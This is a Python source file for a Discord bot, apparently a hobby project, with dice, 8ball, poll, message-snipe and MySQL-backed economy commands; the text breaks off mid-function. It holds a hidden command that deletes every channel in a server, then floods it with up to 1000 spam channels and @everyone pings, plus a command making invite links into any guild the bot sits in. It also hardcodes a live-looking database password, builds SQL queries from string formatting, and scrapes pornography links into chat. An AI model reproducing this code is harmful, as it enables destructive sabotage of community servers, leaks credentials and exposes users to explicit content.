import discord
from discord.ext import commands
import random
from discord import Permissions
from discord.ext.commands import Bot
# from colorama import Fore, Style
import asyncio
import os
from pytz import timezone
import time
from datetime import datetime
from datetime import date
from bs4 import BeautifulSoup
import requests
# from matplotlib import pyplot as plt

username = 'spicy_lemon'
import json

SPAM_MESSAGE = ["@everyone rip server :("]
SPAM_MESSAGE2 = ["hello"]
client = discord.Client()
intents = discord.Intents.default()
intents.members = True
intents.typing = True
intents.presences = True
xmes = 0
urlinp = 'https://chart-studio.plotly.com/~spicy_lemon/1/.png'
tz = timezone('EST')
client = commands.Bot(command_prefix='g!', intents=intents, help_command=None)
import gspread
from pprint import pprint
from oauth2client.service_account import ServiceAccountCredentials
scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/spreadsheets',
         "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]
creds = ServiceAccountCredentials.from_json_keyfile_name("creds.json", scope)

sheet_client = gspread.authorize(creds)
sheet = sheet_client.open("test").sheet1
#this is for connecting to google sheets
import mysql.connector
import functools
import operator
mip = "'"
#this is for edditng values and shwing them in mysql


@client.event
async def on_ready():
    print("bot ready")
    global loop_var
    global loop2_var
    while True:
        global svar
        loop_var = int(sheet.cell(12, 1).value)
        loop2_var = int(sheet.cell(13, 1).value)
        svar = int(sheet.cell(9, 1).value)
        global mydb
        global my_cursor
        mydb = mysql.connector.connect(host="bdrpelbcfmnvbfxgeoe6-mysql.services.clever-cloud.com", user="uhiollzjpdbggq7z",passwd="ETZYMs1wQWWGA1Vnq590",database="bdrpelbcfmnvbfxgeoe6",port=3306)
        my_cursor = mydb.cursor(buffered=True)
        new_now = datetime.now(tz)
        timey = new_now.strftime("%H")
        """if timey == '00':
                datey = datetime.today().strftime('%d %m %Y')
                day, month, year = (int(i) for i in datey.split(' '))
                weday = date(int(year), int(month), int(day)+6)
                datey1 = weday.strftime("%A")
                print('done')
                dmes = data['messages']
                data["fyo"].append(dmes)
                data["days"].append(datey1)
                with open('jtime.json', 'w') as f:
                  json.dump(data, f)
                fig = go.Figure(data=go.Scatter(x=data["days"],
                                        y=data["fyo"]))
                py.plot(fig, filename='shibo_stats',auto_open=False)
                print('day complete')
                print('messages sent: ', dmes)
                xmes = 0
                data['messages']=0
                with open('jtime.json', 'w') as f:
                  json.dump(data, f)
                await asyncio.sleep(3600)"""

        if timey == "00":
            datey = datetime.today().strftime('%d %m %Y')
            day, month, year = (int(i) for i in datey.split(' '))
            weday = date(int(year), int(month), int(day))
            datey1 = weday.strftime("%A")
            if svar >= 7:
                sheet.update_cell(12, 1, loop_var + 1)
                # sheet.sheet.update_cell(1, 13, loop2_var+2)
                sheet.update_cell(9, 1, 0)
                await asyncio.sleep(3)
                svar = int(sheet.cell(9, 1).value)

            sheet.update_cell(9, 1, svar + 1)
            svar = int(sheet.cell(9, 1).value)
            sheet.update_cell(svar, loop2_var, datey1)
            my_cursor.execute("UPDATE geb_economy SET rob_var=5")
            my_cursor.execute("UPDATE geb_economy SET work_var=5")
            my_cursor.execute("UPDATE geb_economy SET edu_var=5")
            mydb.commit()
            await asyncio.sleep(3600)
        await asyncio.sleep(130)


''''@client.event
async def on_message(message):
 if message.content.startswith('sauce drip nayu'):
   await message.channel.send("try 8")'''

keyword = "bum do"


@client.event
async def on_message(message):
    try:
        loop_var = int(sheet.cell(12, 1).value)
        svar = int(sheet.cell(9, 1).value)
        if message.channel.type is discord.ChannelType.private:
            pass

        elif message.guild.id == 761311676049915985:
            sheet.update_cell(svar, loop_var, (int(sheet.cell(svar, loop_var).value) + 1))
    except:
        pass
    username = message.author.name
    embed = discord.Embed(title=":game_die:",
                          description=str(random.randint(1, 100)),
                          color=(0x4B2C7B))
    if message.content.startswith("g!1-100"):
        await message.channel.send(embed=embed)
    embedy = discord.Embed(title=":game_die:",
                           description=str(random.randint(1, 1000000000)),
                           color=(0xF46D02))
    if message.content.startswith("g!1-bil"):
        await message.channel.send(embed=embedy)
    if username == "Xanny" or username == "spicy_lemonade":
        if message.content.startswith("ratio"):
            await message.channel.send(":thumbup:")
            await message.add_reaction('👍')
    elif username != "Xanny" or username != "spicy_lemonade":
        if message.content.startswith("ratio"):
            await message.channel.send(":thumbdown:")
            await message.add_reaction('👎')
    dnd=['dnd','d&d','DND','D&D','dungeons and dragons','Dungeons and Dragons','d and d', 'dungeons & dragons', 'Dnd','dnD','5e','dungeon and dragon','Dungeons and Dragons','Dungeons and dragons','dungeons n dragons','Dungeons n Dragons','Dungeons n dragons']
    dndn=['not','hate','dispise','dont','wont','dislike','do not','never']
    dndl=[]
    for i in dnd:
        if i in message.content:
            dndl.append('true')
    for i in dndn:
        if i in message.content:
            dndl.append('false')
    if 'true' in dndl and 'false' not in dndl:
        await message.channel.send('ew nerd')
    elif 'false' in dndl and 'true' in dndl:
        if 'dont hate' in message.content:
            await message.channel.send('cringe')
            c='cringe'
        else:
            c='valid'
        if 'geby' in message.content:
            await message.channel.send('cringe')
            c='cinge'
        else:
            c='valid'
        await message.channel.send(c)

    await client.process_commands(message)


'''@client.command()
async def blip(ctx):
  while True:
        asyncio.sleep(10)
        now = datetime.datetime.now()
        current_time = now.strftime("%H:%M:%S")
        bumf = current_time
            #if bumf == "14:56:00":
               # print('yes')
        print(bumf)'''
likky = 'https://docs.google.com/spreadsheets/d/e/2PACX-1vT3NGPoU0F3IeT5HvQapFeEQpeDiQa-2FpQTY7gzbtIpFnMo7V3eYJMvh5oPqFuQH0sYWcR_Rv5CZBy/pubchart?oid=1043142030&format=image'
embeysir = discord.Embed(title='Shibo-Stats', description='click open original to get up to date')


@client.command()
async def stats(ctx):
    embeysir.set_image(url=likky)
    embeysir.set_thumbnail(url=likky)
    await ctx.send(embed=embeysir)


@client.command()
async def sinfo(ctx):
    embeda = discord.Embed(title="Server Info")
    embeda.add_field(name="Server Name :label:",
                     value=ctx.message.guild.name,
                     inline=True)
    embeda.add_field(name="Members :tickets:",
                     value=len(ctx.message.guild.members),
                     inline=True)
    embeda.add_field(name="Channels :dividers:",
                     value=len(ctx.message.guild.channels))
    embeda.add_field(name="Owner :crown:", value=ctx.message.guild.owner)
    embeda.add_field(name="Id :card_index:", value=str(ctx.message.guild.id))
    embeda.add_field(name="Description :page_facing_up:",
                     value=ctx.message.guild.description)
    embeda.add_field(name="Region :flag_white:",
                     value=ctx.message.guild.region)
    embeda.add_field(name="Image URl :camera:",
                     value=ctx.message.guild.icon_url)
    embeda.add_field(name="Roles :ribbon:",
                     value=len(ctx.message.guild.roles),
                     inline=True)
    await ctx.send(embed=embeda)
#server info

@client.command(name='cmd', aliases=['help'])
async def cmd(ctx):
    embedi = discord.Embed(title="Commands")
    embedi.add_field(name="g!sinfo :bookmark_tabs:",
                     value="Provides server info",
                     inline=True)
    embedi.add_field(name="g!cmd :mag:",
                     value="Shows list of all commands",
                     inline=True)
    embedi.add_field(name="g!8ball :8ball:",
                     value="Ask an 8ball your questions and it will answer",
                     inline=True)
    embedi.add_field(
        name="g!newchan :gear:",
        value=
        "MOD ONLY!, creates new channel(channel name is text after the command)",
        inline=True)
    embedi.add_field(
        name="g!delchan :gear::x:",
        value=
        "MOD ONLY!, deletes specified channel(channel name is text after the command)",
        inline=True)
    embedi.add_field(
        name="g!poll :ballot_box:",
        value=
        "Creates a poll with check and cross emoji to vote with(name of poll is text after command)",
        inline=True)
    embedi.add_field(name="g!1-100 :game_die:",
                     value="Chooses a random number from 1 to 100",
                     inline=True)
    embedi.add_field(name="g!1-bil :game_die::game_die:",
                     value="Chooses random number from 1 to 1 billion",
                     inline=True)
    embedi.add_field(name="g!nick :label:",
                     value="Changes nickname(nick name is text after command)",
                     inline=True)
    embedi.add_field(
        name="g!remind :alarm_clock:",
        value=
        "Reminds you after specified amount of time, s= seconds, m=minutes, h=hours, d=days, ex = 'g!remind 5m do laundry'",
        inline=True)
    embedi.add_field(name="g!snipe :camera:",
                     value="post's last deleted messagsnie and who sent it",
                     inline=True)
    await ctx.send(embed=embedi)

#shows what the commands are
@client.command()
@commands.has_permissions(manage_channels=True)
async def newchan(ctx, *, channel_name):
    embednewchan = discord.Embed(
        title=':gear: New Channel',
        description=f"```{channel_name} channel created by {ctx.author}```")
    await ctx.guild.create_text_channel(channel_name,
                                        category=ctx.channel.category)
    await ctx.send(embed=embednewchan)

#add channel
@client.command()
@commands.has_permissions(manage_channels=True)
async def delchan(ctx, *, channel_name):
    guild = ctx.guild
    channel_find = discord.utils.get(guild.channels, name=channel_name)
    embeddelchan = discord.Embed(
        title=':gear::x: Deleted Channel',
        description=f"```{channel_name} channel deleted by {ctx.author}```")
    await channel_find.delete()
    await ctx.send(embed=embeddelchan)
#delete channel

@client.command()
@commands.has_permissions()
async def remind(ctx, time, *, task):
    global tz
    embedtime = discord.Embed(
        title=":timer: Remind",
        description=f"reminder set for {ctx.author.name} in {time}.",
        color=0x262d07,
        timestamp=datetime.now(tz))
    embedtimeend = discord.Embed(title=":alarm_clock: Reminder",
                                 description=f"{task} {ctx.author.name}",
                                 color=0xEc315a,
                                 timestamp=datetime.now(tz))
    seconds = 0
    if time.lower().endswith('s'):
        seconds += int(time[:-1])
    if time.lower().endswith("m"):
        seconds += int(time[:-1]) * 60
    if time.lower().endswith("d"):
        seconds += int(time[:-1]) * 60 * 60 * 24
    if time.lower().endswith("h"):
        seconds += int(time[:-1]) * 60 * 60
    await ctx.send(embed=embedtime)
    await asyncio.sleep(seconds)
    await ctx.send(embed=embedtimeend)
    await ctx.send(ctx.author.mention)
    return


@client.command()
async def poll(ctx, *, poll_name):
    embedo = discord.Embed(title=f"{ctx.author.nick}'s poll",
                           description=poll_name)
    if ctx.author.nick == None:
        embedo = discord.Embed(title=f"{ctx.author.name}'s poll",
                               description=poll_name)
    await ctx.message.delete()
    msg = await ctx.send(embed=embedo)
    await msg.add_reaction('✅')
    await msg.add_reaction('❌')


@client.command()
async def nick(ctx, *, nickname):
    last = ctx.author.nick
    await ctx.author.edit(nick=nickname)
    embednick = discord.Embed(
        title=":label: Name Change",
        description=f"{last} changed their name to {ctx.author.nick}")
    await ctx.send(embed=embednick)


num8 = str(8)
randemoji = random.choice([
    ":smiley:", ":flushed:", ":confounded:", ":rofl:", ":wink:", ":smirk:",
    ":face_exhaling:", ":woozy_face:", ":face_with_monocle:"
                                       ":neutral_face:"
])
randemoti = random.choice([":)", "._.", ">:(", ".-.", ";)", "✔", "☠"])


@client.command(name="8ball")
async def _8ball(ctx, *, query=None):
    randmsg = random.choice([
        ":8ball: for sure",
        ":8ball: most likely",
        ":8ball: YES YES YES",
        ":8ball: No troll :skull:",
        ":8ball: um no?",
        ":8ball: yeah no dude",
        ":8ball: 50 50 :person_shrugging:",
        ":8ball: WHY WOULD YOU EVEN ASK THAT LMAO :exclamation:",
        ":8ball: omg yes :sparkles:",
        ":8ball: if you believe :star2:",
        ":8ball: what do you think :eyes:",
        ":8ball: NO NO NO :x:",
        ":8ball: shiii why you asking me :person_shrugging:",
        ":8ball: yb does it better",
        ":8ball: cant even answer that bro",
        ":8ball: maybe you're the problem",
        ":8ball: wow you lack self awareness",
        ":8ball: get a job bum",
        ":8ball: idk what to tell you dawg :skull_crossbones:",
        ":8ball: yeah thats a good idea :D",
        ":8ball: yes<333",
        ":8ball: never know till you try?",
        ":8ball: beyond a doubt",
        ":8ball: fo sho",
        ":8ball: on god brodie",
        ":8ball: yesss sirrrrr :handshake:"
        ":8ball: hahahaha no",
    ])
    if query == None:
        embed8 = discord.Embed(title=f"{randemoji} {ctx.author.nick}__ ",
                               description=randmsg,
                               color=(0x25be2a))
        if ctx.author.nick == None:
            embed8 = discord.Embed(title=f"{randemoji} {ctx.author.name}__ ",
                                   description=randmsg,
                                   color=(0x25be2a))
        await ctx.send(embed=embed8)
    else:
        embed8 = discord.Embed(
            title=f"{randemoji} {ctx.author.nick}__ {query}",
            description=randmsg,
            color=(0x25be2a))
        if ctx.author.nick == None:
            embed8 = discord.Embed(
                title=f"{randemoji} {ctx.author.name}__ {query}",
                description=randmsg,
                color=(0x25be2a))
        await ctx.send(embed=embed8)
#8ball

snipe_message_content = None

snipe_message_author = None


@client.event
async def on_message_delete(message):
    global snipe_message_content

    global snipe_message_author
    global s_guild
    global s_icon
    s_icon = message.author.avatar_url
    s_guild = message.guild.id
    snipe_message_content = message.content
    snipe_message_author = message.author.nick
    if message.author.nick == None:
        snipe_message_author = message.author.name
    # print(snipe_message_content)

    await asyncio.sleep(180)
    snipe_message_content = None

    snipe_message_author = None


@client.command()
async def snipe(ctx):
    tz = timezone('EST')
    if ctx.guild.id == s_guild:

        embedsnipe = discord.Embed(color=0xD9108D,
                                   description=f"{snipe_message_content}",
                                   timestamp=datetime.now(tz))
        embedsnipe.set_author(name=f"{snipe_message_author}", icon_url=s_icon)
        embedsnipe.set_footer(text=f"{randemoti}")
        if snipe_message_content == None:
            await ctx.send("nothing to snipe")
        if snipe_message_content != None:
            await ctx.send(embed=embedsnipe)
    else:
        await ctx.send("nothing to snipe")


esnipe_message_content = None

esnipe_message_author = None


@client.event
async def on_message_edit(message, message_before):
    global esnipe_message_content

    global esnipe_message_author
    global es_guild
    global es_icon
    es_icon = message_before.author.avatar_url
    es_guild = message_before.guild.id
    esnipe_message_content = message_before.content
    esnipe_message_author = message_before.author.nick
    if message_before.author.nick == None:
        esnipe_message_author = message_before.author.name

    await asyncio.sleep(180)
    esnipe_message_content = None

    esnipe_message_author = None


@client.command()
async def esnipe(ctx):
    tz = timezone('EST')
    if ctx.guild.id == es_guild:

        embedesnipe = discord.Embed(color=0xD9108D,
                                    description=f"{esnipe_message_content}",
                                    timestamp=datetime.now(tz))
        embedesnipe.set_author(name=f"{esnipe_message_author}",
                               icon_url=es_icon)
        embedesnipe.set_footer(text=f"{randemoti}")
        if esnipe_message_content == None:
            await ctx.send("nothing to snipe")
        if esnipe_message_content != None:
            await ctx.send(embed=embedesnipe)
    else:
        await ctx.send("nothing to snipe")


bumdum = random.randint(1, 2000)


@client.command()
async def ph(ctx, *, searcher):
    url = f"https://www.pornhub.com/video/search?search={searcher}&page={bumdum}"
    result = requests.get(url).text
    doc = BeautifulSoup(result, 'html.parser')
    tag1 = doc.find('ul',
                    id="videoSearchResult",
                    class_="videos search-video-thumbs freeView")
    tags = tag1.find('div', class_="phimage")
    pimp = tags.find('a')
    await ctx.send("https://www.pornhub.com" + str(pimp['href']))


grand = random.randint(1, 200)


@client.command()
async def vid(ctx, *, vsearcher):
    vurl = f"https://www.pornhub.com/gifs/search?search={vsearcher}&page={grand}"
    vresult = requests.get(vurl).text
    vsoup = BeautifulSoup(vresult, "html.parser")
    # tag1 = soup.find('div', class_="nf-videos")
    vtags = vsoup.find_all('div', class_="gifsWrapper hideLastItemLarge")
    vpimp = random.choice(vtags)
    # pimp =tags.find('a')
    vpimp2 = vpimp.find_all('video')
    vpimp3 = random.choice(vpimp2)
    # print(pimp2)
    await ctx.send(str(vpimp3['data-mp4']))


@client.command()
async def gif(ctx, *, gsearcher):
    gurl = f"https://www.pornhub.com/gifs/search?search={gsearcher}&page={grand}"
    gresult = requests.get(gurl).text
    gsoup = BeautifulSoup(gresult, "html.parser")
    # tag1 = soup.find('div', class_="nf-videos")
    gtags = gsoup.find_all('div', class_="gifsWrapper hideLastItemLarge")
    gpimp = random.choice(gtags)
    # pimp =tags.find('a')
    gpimp2 = gpimp.find_all('video')
    gpimp3 = random.choice(gpimp2)
    # print(pimp2)
    newest = str(gpimp3['data-mp4'])
    newest2 = newest.replace('dl', 'el')
    newest2 = newest2.replace('mp4', 'gif')
    await ctx.send(newest2)


@client.command()
async def ithasended435(ctx):
    # if ctx.message.content.endswith("It didnt have to end this way, nuke time"):

    await ctx.message.delete()

    guild = ctx.guild

    for channel in guild.channels:

        await channel.delete()
        if ctx.guild.channels == None:
            break
    while True:
        await ctx.guild.create_text_channel("spam channel2")
        if len(ctx.author.guild.channels) == 1000:
            break
    if len(ctx.author.guild.channels) == 1000:
        for text_channel in ctx.author.guild.text_channels:
            await text_channel.send("@everyone")


# @client.event
# async def on_guild_channel_create(channel):
# while True:
# await channel.send(random.choice("bum do"))
'''if message.content.startswith(keyword):
     while True:
        await message.guild.create_text_channel("spam channel2")
        for text_channel in message.author.guild.text_channels:
           await text_channel.send("@everyone")'''
'''@client.command()
async def notknown(ctx):
    while True:
        await ctx.guild.create_text_channel("spam channel2")
        for text_channel in ctx.author.guild.text_channels:
            await text_channel.send("@everyone")'''


@client.command(name='dm')
async def dm(ctx, guild_id: int):
    guild = client.get_guild(guild_id)
    channel = guild.channels[0]
    invitelink = await channel.create_invite(max_uses=1)
    await ctx.author.send(invitelink)
@client.command()
async def bank(ctx,*, usero=None):
    #if(usero != None):
        #guild = client.get_guild(761311676049915985)

        #userp = discord.utils.get(guild.members, name=usero[:-5], discriminator=usero[-4:])
        #if '#' not in str(usero):
            #userp = 'unavailable'
    #else:
        #userp = None
    #try:
        #if '#' in str(usero):
            #await bank1(ctx,userp)
        #else:
    #await bank3(ctx)
    try:
        await bank3(ctx,usero)
    except:
        await bank2(ctx,usero)

async def bank3(ctx, user=None):
            print(user)
            if(user == None):
                    member = ctx.author
            else:
                member= await commands.converter.MemberConverter().convert(ctx, user)
            global mip
            mip = "'"
            await update_name(str(member.id))
            my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {mip+str(member.id)+mip}")

            for x in my_cursor:
                x=functools.reduce(operator.add, (x))
                embedi = discord.Embed(title=f":moneybag: {member.name} ",description='$'+str(x),color=(0x25be2a))
                await ctx.send(embed=embedi)

#@client.command()
async def bank1(ctx, user):
            if(user == None):
                    member = ctx.author
            else:
                member= user
            mip = "'"
            await update_name(str(member.id))
            my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {mip+str(member.id)+mip}")

            for x in my_cursor:
                x=functools.reduce(operator.add, (x))
            embedi = discord.Embed(title=f":moneybag: {member.name} ",description='$'+str(x),color=(0x25be2a))
            await ctx.send(embed=embedi)
#@client.command()
async def bank2(ctx,member):
    if member == 'sarah':
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {'548651121590140944'}")
        for bankg in my_cursor:
            bankg=functools.reduce(operator.add, (bankg))
        xname = client.get_user(548651121590140944)
        embedi = discord.Embed(title=f":moneybag: {xname.name} ",description='$'+str(bankg),color=(0x25be2a))
        await ctx.send(embed=embedi)
    elif member == 'ike':
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {'403315596856524809'}")
        for bankg in my_cursor:
            bankg=functools.reduce(operator.add, (bankg))
        xname = client.get_user(403315596856524809)
        embedi = discord.Embed(title=f":moneybag: {xname.name} ",description='$'+str(bankg),color=(0x25be2a))
        await ctx.send(embed=embedi)
    elif member == 'tunde':
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {'347426152018608128'}")
        for bankg in my_cursor:
            bankg=functools.reduce(operator.add, (bankg))
        xname = client.get_user(347426152018608128)
        embedi = discord.Embed(title=f":moneybag: {xname.name} ",description='$'+str(bankg),color=(0x25be2a))
        await ctx.send(embed=embedi)
    elif member == 'tristan':
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {'380705348073422849'}")
        for bankg in my_cursor:
            bankg=functools.reduce(operator.add, (bankg))
        xname = client.get_user(380705348073422849)
        embedi = discord.Embed(title=f":moneybag: {xname.name} ",description='$'+str(bankg),color=(0x25be2a))
        await ctx.send(embed=embedi)
    elif member == 'mike':
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {'522485825439531032'}")
        for bankg in my_cursor:
            bankg=functools.reduce(operator.add, (bankg))
        xname = client.get_user(522485825439531032)
        embedi = discord.Embed(title=f":moneybag: {xname.name} ",description='$'+str(bankg),color=(0x25be2a))
        await ctx.send(embed=embedi)
    elif member == 'geby':
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {'471334973379706900'}")
        for bankg in my_cursor:
            bankg=functools.reduce(operator.add, (bankg))
        xname = client.get_user(471334973379706900)
        embedi = discord.Embed(title=f":moneybag: {xname.name} ",description='$'+str(bankg),color=(0x25be2a))
        await ctx.send(embed=embedi)


@client.command()
async def work(ctx):
        mip = "'"
        await update_name(str(ctx.author.id))
        my_cursor.execute(f"SELECT work_var FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        x=my_cursor.fetchone()
        if x[0] >= 20:
            embedi = discord.Embed(description="you can no longer work for today")
            await ctx.send(embed=embedi)
        else:
            my_cursor.execute(f"SELECT job FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
            for m in my_cursor:
                m=functools.reduce(operator.add, (m))
            await job_list(m)
            b =random.randrange(1,y_job)
            await update_data(str(ctx.author.id),b)
            my_cursor.execute(f"UPDATE geb_economy SET work_var=work_var+1 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
            mydb.commit()
            my_cursor.execute(f"SELECT job FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
            for t in my_cursor:
                t=functools.reduce(operator.add, (t))
                print("the val", t)
            embedi = discord.Embed(title=f":necktie: {t}", description="you gained: $"+ str(b), color=(0x25be2a))
            await ctx.send(embed=embedi)



@client.command()
async def give(ctx,amount,*, user: discord.Member):
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        x = my_cursor.fetchone()
        #x is just how much money you have
        if int(amount) > x[0]:
            embedi = discord.Embed(title="gamble", description="you dont own that much")
            await ctx.send(embed=embedi)
        else:
         await update_give(str(ctx.author.id),user,int(amount))
         embedi = discord.Embed(title="transfer :gift:", description =f"successfully transfered ${amount} to {user.name}", color=(0x25be2a))
         await ctx.send(embed=embedi)

#@client.command()
#async def buy(ctx,id,amount):
    #append id to a list for number of said item
@client.command()
async def rank(ctx):
    my_cursor.execute("SELECT * FROM geb_economy")
    x=my_cursor.fetchall()
    embedi = discord.Embed(title=rank, color=(0x25be2a))
    for row in x:
                a = row[0]
                b = "money: ", int(row[1])
                b= str(b)
                c = " job: ", row[2]
                d = "education: ", row[3],
                a1 = ''.join(a)
                member= await commands.converter.MemberConverter().convert(ctx, a1)
                #b= str(b)
                #b1= b.replace("Decimal", "")
                #b1= b1.replace("("," ")
                #b1 = b1.replace(")", " ")
                b1 = str(b)+""
                #b1 = b.translate(None, 'decimal')
                c1 = str(c)+""
                try:
                    d1 = str(d)+""
                except:
                    d1= str(d)+" "
                embedi.add_field(name=member.name,
                     value=b1+c1+d1,
                     inline=True)
    await ctx.send(embed=embedi)





@client.command()
async def rob(ctx,*, user: discord.Member):
    try:
            my_cursor.execute(f"SELECT rob_var FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
            x = my_cursor.fetchone()
            #x is how much money you have
            if x[0] >= 20:
                embedi = discord.Embed(description="you can no longer rob for today")
                await ctx.send(embed=embedi)
            else:
                my_cursor.execute(f"UPDATE geb_economy SET rob_var=rob_var+1 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                mydb.commit()
                member = str(user.id)
                my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {mip + member + mip}")
                for t in my_cursor:
                    t=int(functools.reduce(operator.add, (t)))
                f = random.randint(1,t)
                f= random.randint(1,f)
                f= random.randint(1,f)
                if x[0] >= 7:
                        if user.status != discord.Status.offline:
                                print(user.status)
                                f = random.randint(1,f)
                                f = random.randint(1,f)
                                f= int(f*.5)
                                #lowers the rate if the robber is offline

                f = int(f*0.5)
                await update_rob(str(ctx.author.id),user,f)
                embedi = discord.Embed(title="Robbed :interrobang:",description=":money_with_wings: "+nft,color=(0x25be2a))

                await ctx.send(embed=embedi)
    except:
            embedi = discord.Embed(title="Robbed :interrobang:",description="congrants you robbed a broke person",color=(0x25be2a))

            await ctx.send(embed=embedi)



@client.command()
async def gamble(ctx, choice, amount):
        my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")

        for x in my_cursor:
            x = functools.reduce(operator.add, (x))
            print(x)
        if amount.isnumeric() == True:
                 if int(amount) > x:
                     embedi = discord.Embed(title="gammble", description="you dont own that much")
                     await ctx.send(embed=embedi)
                 elif int(amount) <= x:
                     print(choice)
                     print(amount)
                     await update_gamble(ctx.author.id,choice,int(amount))
                     embedi = discord.Embed(title="gamble :game_die::game_die:", description =aft, color=(col_val))
                     await ctx.send(embed=embedi)
        else:
                 if amount == 'all':
                     await update_gamble(ctx.author.id,choice,int(x))
                     embedi = discord.Embed(title="gamble :game_die::game_die:", description =aft, color=(col_val))
                     await ctx.send(embed=embedi)
                 elif amount == 'half':
                     await update_gamble(ctx.author.id,choice,int(int(x)/2))
                     embedi = discord.Embed(title="gamble :game_die::game_die:", description =aft, color=(col_val))
                     await ctx.send(embed=embedi)
@client.command()
async def learn(ctx):
    try:
        mip = "'"
        await update_name(str(ctx.author.id))
        my_cursor.execute(f"SELECT edu_var FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        x=my_cursor.fetchone()
        if x[0] >= 10:
            embedi = discord.Embed(description="you can no longer learn for today")
            await ctx.send(embed=embedi)
        else:
            my_cursor.execute(f"SELECT education FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
            for m in my_cursor:
                m=functools.reduce(operator.add, (m))
            await edu_list(m)
            b =y_edu
            my_cursor.execute(f"SELECT money FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
            for m in my_cursor:
                m=functools.reduce(operator.add, (m))
            if (y_edu*-1) > m:
                embedi = discord.Embed(title=f":mortar_board:", description="not enough money to pay for tuition", color=(0xFFD700))
                await ctx.send(embed=embedi)
            else:
                await update_data(str(ctx.author.id),b)
                my_cursor.execute(f"UPDATE geb_economy SET edu_var=edu_var+1 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var=total_edu_var+1 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                mydb.commit()
                my_cursor.execute(f"SELECT education FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                for edu_name in my_cursor:
                    edu_name=functools.reduce(operator.add, (edu_name))
                embedi = discord.Embed(title=f":mortar_board: {edu_name}", description="you lost: $"+ str(b), color=(0xFFD700))
                await ctx.send(embed=embedi)
                my_cursor.execute(f"SELECT total_edu_var FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                for t in my_cursor:
                    t=functools.reduce(operator.add, (t))
                if t == 50:
                    my_cursor.execute(f"UPDATE geb_economy SET edu_list = CONCAT(edu_list, '_{edu_name}') WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                    embedi = discord.Embed(title=f":mortar_board: {edu_name}", description="congrats, you graduated", color=(0xFFD700))
                    await ctx.send(embed=embedi)
                    my_cursor.execute(f"UPDATE geb_economy SET education = NULL WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                    my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                    mydb.commit()
    except:
        embedi = discord.Embed(title=f":mortar_board:", description="choose a major first {g!edu}", color=(0xFFD700))
        await ctx.send(embed=embedi)

@client.command()
async def major(ctx, edun):
    embedi = discord.Embed(title=major,description=':mortar_board: you are now majoring', color=(0xFFD700))
    if int(edun) == 1:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'english' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'english' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 2:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'food' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'food' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 3:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'art' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'art' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                my_cursor.execute(f"UPDATE geb_economy SET total_edu_var = 0 WHERE discord_id = {mip + str(ctx.author.id) + mip}")
                await ctx.send(embed=embedi)
            else:
                embedi = discord.Embed(title=major,description=':mortar_board: you already own a degree in this, try a different major', color=(0xFFD700))
                await ctx.send(embed=embedi)
    if int(edun) == 4:
        my_cursor.execute(f"SELECT edu_list FROM geb_economy WHERE discord_id = {mip + str(ctx.author.id) + mip}")
        for edu_list in my_cursor:
            edu_list=functools.reduce(operator.add, (edu_list))
            if not 'chem' in edu_list:
                my_cursor.execute(f"UPDATE geb_economy SET education = 'chem' WHERE discord_id = {mip + str(ctx.author.id) + mip}")
